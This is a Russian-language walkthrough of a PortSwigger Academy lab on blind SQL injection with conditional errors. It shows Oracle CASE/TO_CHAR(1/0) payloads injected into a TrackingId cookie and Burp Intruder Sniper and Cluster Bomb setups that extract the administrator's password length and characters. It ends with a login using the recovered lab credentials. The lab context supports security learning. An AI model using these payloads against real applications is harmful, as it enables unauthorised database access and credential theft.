Перейдем на форму логина на уязвимый ресурс, и найдем данный `GET` запрос в `Proxy` -> `HTTP history`
```
GET /login
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/1.png)
Модифицируем наш запрос, добавив `' AND 1=1 --` в поле `Cookie`, и увидим, что нам выдало `200 респонс`, а значит, сервер обработал наш запрос, и `SQL-инъекция возможна`
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND 1=1 --;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/3.png)
Далее воспользуемся условиями case для решшения лабораторной работы
Суть в том, что можно заставить приложение вернуть другой ответ в зависимости от того, произошла ли ошибка SQL. Вы можете изменить запрос так, чтобы он вызывал ошибку базы данных только в том случае, если условие истинно. Очень часто необработанная ошибка, выданная базой данных, приводит к некоторым изменениям в ответе приложения, например к появлению сообщения об ошибке. Это позволяет вам сделать вывод об истинности введенного состояния.
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a' --;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/4.png)

Воспользуемся знанием о наличии УЗ `administrators` и таблицы `users`, в которой есть поля `username`, `password`. И выберем очевидно невероятную длину пароля, чтобы вызвать ошибку во внутреннем условии CASE
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND (SELECT CASE WHEN LENGTH(password)>100 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --; 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/5.png)

А вот следующий запрос не увенчается успехом 
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --; 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/6.png)
Давайте отправим данный запрос в `Intruder` и узнаем размер пароля УЗ `administrator`.

Выберем тип атаки - `Sniper`
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND (SELECT CASE WHEN LENGTH(password)>§1§ THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --; 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/7.png)
В конфигах к атаке возьмем диапазон от проверки пароля от 1 до 30
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/8.png)
Запустим атаку, и посмотрим с какой длины пароля нам возвращается не 500 респонс статус код, а 200

Видим, что в `пароле 20 символов`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/9.png)
Отлично, теперь мы знаем длину пароля. Осталось дело за малым - узнать сам пароль

Для этого вернемся в Repeater и сконфигурируем запрос для того, чтобы узнать конкретный символ пароля на первой позиции пароля с помощью метода `SUBSTR`
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --; 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/10.png)
Отправим запрос в `Intruder`

Чтобы брутить сразу по 2-ум параметрам, необходимо выбрать тип атаки - `Cluster Bomb`
```
Cookie: TrackingId=fBwHDTGFiN40JZO1' AND (SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/11.png)
В первом пэйлоаде выберем `Numbers`, так как мы знаем что пароль у нас 20 символов, и нужно перебрать каждый из них
И соответсвенно поставим разброс чисел от 1 до 20.
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/12.png)
Во втором пэйлоаде выберем `Simple list`, так как у нас есть конкретные символы, которые могут входить в состав пароля
В качестве этих символов выберем семейство символов `a-z` и `0-9`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/13.png)
И чтобы нам было удобнее обрабатывать результат - на вкладке `Settings` выберем `Grep-match` и добавим туда значение `Internal server error` который при нашем условии будет означать, что мы нашли верный символ от пароля
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/14.png)
Запустим атаку и отсортируем по полю `Internal server error`

И получим, что найденный пароль - `diwr6sfwdftidsfmnalo`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/15.png)

Залогинимся с кредами `administrator:diwr6sfwdftidsfmnalo` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/8.%20Blind%20SQL%20injection%20with%20conditional%20errors/pics%20for%20walktrough/16.png)
